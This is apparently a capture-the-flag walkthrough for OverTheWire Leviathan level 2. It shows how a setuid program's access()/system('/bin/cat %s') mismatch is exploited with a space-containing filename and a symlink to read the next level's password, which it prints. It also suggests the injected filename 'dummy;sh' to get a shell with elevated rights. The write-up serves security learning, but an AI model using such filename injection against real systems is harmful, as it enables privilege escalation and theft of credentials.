__Leviathan :: Level 2__
================


_John Hammond_ | _Tuesday, November 3rd, 2015_ 


> There is no information for this level, intentionally.


----------


Start by [`ssh`][ssh]ing into the level. Supply the password you retrieved in the previous level. 

```
ssh leviathan2@leviathan.labs.overthewire.org
```

If you run the [`ls`][ls] command, you'll see there is just one file `printfile`. If we try and run the program, it tells use we need a filename argument. We can assume this program acts just like [`cat`][cat]: all it does is display the contents of a file onto the screen.

Our goal remains to get the password for the next level. So what happens if we give that as the argument?

```
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Uh, okay, error message. That doesn't help. It seems like we have to fool the program into actually displaying that file. We can probably do this with a [symbolic link] or something, but I guess we'll see as we explore more.

Let's get into a directory where we have write permission and can actually do things (the `/tmp`).

Now we can try to see what the program actually does with the same [`ltrace`][ltrace] tool.

```
leviathan2@melinda:~$ mkdir /tmp/playground
leviathan2@melinda:~$ cd /tmp/playground
leviathan2@melinda:/tmp/playground$ ltrace ~/printfile /etc/leviathan_pass/leviathan3 
__libc_start_main(0x804852d, 2, 0xffffd754, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)      = -1
puts("You cant have that file..."You cant have that file...
)               = 27
+++ exited (status 1) +++
```

It looks like it uses the [C] [`access`][access] function to test if the user actually has access to the file. [`access`][access] actually uses the [real user ID] rather than the [effective user ID] so it will actually only have privileges of our current user, `leviathan2`.

So that is what happens if it _fails_, and we actually can't see the file. 

What about if we _succeed_, and can actually see the file? Check out the [`ltrace`][ltrace] output.

```
leviathan2@melinda:/tmp/playground$ echo "This should work!" > dummy
leviathan2@melinda:/tmp/playground$ ~/printfile dummy
This should work!
leviathan2@melinda:/tmp/playground$ ltrace ~/printfile dummy
__libc_start_main(0x804852d, 2, 0xffffd754, 0x8048600 <unfinished ...>
access("dummy", 4)                               = 0
snprintf("/bin/cat dummy", 511, "/bin/cat %s", "dummy") = 14
system("/bin/cat dummy"This should work!
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

Oh hey! Okay! So once [`access`][access] actually succeeds and we continue on in the program, it just throws the file at a [`system`][system] call, to execute the command "/bin/cat <the_filename>" (it just runs the [`cat`][cat] command).

Let's think about this. If the filename just gets passed into a string and execute like a console command, what's to stop us from actually having a space in our filename, so [`cat`][cat] thinks it is a second file and then displays it?

So we would pass in a file with the filename something like, "dummy solution.txt". We would have to create one file "dummy solution.txt" just so the [`access`][function] would have something to check and return successful with. We would have one file another, 'dummy', which doesn't particularly matter (it actually doesn't even have to exist) but something should still be in the filename before the space. [`cat`][cat] should display this first.

Then the _real_ magic comes from another file, which would be the second half of the original filename: "solution.txt". _This_ is where we actually create a [symbolic link] for the next level's password file.

Since the program's [effective user id] is the one for the next level, whatever it executes (in this case [`cat`][cat]) will be run as that level's user (so we can see their password!)

Here's how it all breaks down.

```
leviathan2@melinda:/tmp/playground$ touch "dummy solution.txt"
leviathan2@melinda:/tmp/playground$ ln -s /etc/leviathan_pass/leviathan3 solution.txt
leviathan2@melinda:/tmp/playground$ ls
dummy  dummy solution.txt  solution.txt
leviathan2@melinda:/tmp/playgroun d$ ~/printfile "dummy solution.txt" 
This should work!
Ahdiemoo1j
```

_And we got it!_

__The password for leviathan3 is `Ahdiemoo1j`.__

(Note: you could just as easily do this by creating a file that essentially has a command inside the filename, like "dummy;sh". This would throw you at a shell with level3's privileges and you could then read the password file.)

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier